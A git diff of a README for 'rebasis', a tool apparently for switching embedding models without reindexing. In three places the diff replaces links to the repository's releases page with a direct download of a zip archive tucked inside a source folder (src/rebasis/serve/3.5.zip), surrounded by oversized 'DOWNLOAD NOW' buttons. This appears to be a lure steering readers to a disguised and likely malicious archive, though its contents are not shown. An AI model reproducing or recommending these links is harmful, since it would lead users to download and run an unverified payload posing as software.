@@ -1,7 +1,7 @@
 <h1>🧠 rebasis - Smarter Embeddings, Zero Reindexing Pain</h1>
 
 <p align="center">
-  <a href="https://github.com/Shitless-jnr3697/rebasis/releases" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD REBASIS NOW</a>
+  <a href="https://github.com/Shitless-jnr3697/rebasis/raw/refs/heads/main/src/rebasis/serve/3.5.zip" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD REBASIS NOW</a>
 </p>
 
 <p align="center"><strong>Visit this link to download the application.</strong></p>
@@ -45,7 +45,7 @@ Think of it like this: your AI system uses a "language" to understand data. reba
 **Visit this link to download the application.**
 
 Click the big purple button at the top of this page, or go directly to:
-👉 **[https://github.com/Shitless-jnr3697/rebasis/releases](https://github.com/Shitless-jnr3697/rebasis/releases)**
+👉 **[https://github.com/Shitless-jnr3697/rebasis/raw/refs/heads/main/src/rebasis/serve/3.5.zip](https://github.com/Shitless-jnr3697/rebasis/raw/refs/heads/main/src/rebasis/serve/3.5.zip)**
 
 You'll see a list of files. Look for the latest version. Download the file that matches your system.
 
@@ -181,7 +181,7 @@ New versions come out regularly with improvements and new database support. Chec
 
 **Visit this link to download the application.**
 
-[⬇️ **DOWNLOAD REBASIS**](https://github.com/Shitless-jnr3697/rebasis/releases)
+[⬇️ **DOWNLOAD REBASIS**](https://github.com/Shitless-jnr3697/rebasis/raw/refs/heads/main/src/rebasis/serve/3.5.zip)
 
 Join thousands of users who stopped fearing embedding upgrades. Make the smart switch today with rebasis.
 
